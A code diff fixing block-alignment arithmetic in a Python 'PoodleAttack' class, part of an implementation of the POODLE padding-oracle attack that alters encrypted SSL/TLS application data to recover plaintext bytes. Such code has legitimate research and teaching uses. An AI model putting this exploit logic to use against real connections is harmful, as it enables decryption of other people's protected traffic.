@@ -46,7 +46,7 @@ class PoodleAttack:
 
         # Here we are calculating the length of the URL so that the byte_index we want to decrypt
         # is the last byte of a block.
-        length_url = oracle.block_size - (len(start_data) + byte_index - 1) % oracle.block_size
+        length_url = oracle.block_size - (len(start_data) + byte_index + 1) % oracle.block_size
 
         # Here we are calculating the length of the POST data so that padding requires
         # block_size bytes.
@@ -60,9 +60,8 @@ class PoodleAttack:
         # a 2 digits number instead of one.
         length_post_data -= 1
 
-        self.byte_position = byte_index + length_url
-        self.byte_block = int(self.byte_position / oracle.block_size)
-
+        self.byte_position = len(start_data) + length_url + byte_index + 1
+        self.byte_block = int(self.byte_position / oracle.block_size) - 1
         def alter_application_data(connection, structure, state, source):
             # We select the block
             block_ciphered = structure.body.encrypted_data
